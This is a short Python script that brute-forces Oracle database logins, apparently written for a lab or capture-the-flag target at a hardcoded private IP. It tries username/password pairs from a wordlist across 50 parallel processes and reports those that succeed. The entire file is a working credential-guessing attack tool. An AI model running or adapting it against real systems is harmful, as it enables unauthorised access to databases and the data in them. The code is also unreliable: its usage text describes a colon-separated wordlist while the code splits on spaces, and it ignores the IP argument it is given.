#!/usr/bin/env python

import cx_Oracle
import sys
from multiprocessing import Pool

MAX_PROC = 50
host = "10.10.10.82"
sid = "XE"

def usage():
    print("{} [ip] [wordlist]".format(sys.argv[0]))
    print("  wordlist should be of the format [username]:[password]")
    sys.exit(1)

def scan(userpass):
    u, p = userpass.split(' ')[:2]
    try:
        conn = cx_Oracle.connect('{user}/{pass_}@{ip}/{sid}'.format(user=u, pass_=p, ip=host, sid=sid))
        return u, p, True
    except cx_Oracle.DatabaseError:
        return u, p, False


def main(host, userpassfile, nprocs=MAX_PROC):
    with open(userpassfile, 'r') as f:
        userpass = f.read().rstrip().replace('\r','').split('\n')

    pool = Pool(processes=nprocs)

    for username, pass_, status in pool.imap_unordered(scan, [up for up in userpass]):
        if status:
            print("Found {} / {}\n\n".format(username, pass_))
        else:
            sys.stdout.write("\r {}/{}                               ".format(username, pass_))

if __name__ == '__main__':
    if len(sys.argv) != 3:
        usage()
    main(sys.argv[1], sys.argv[2])
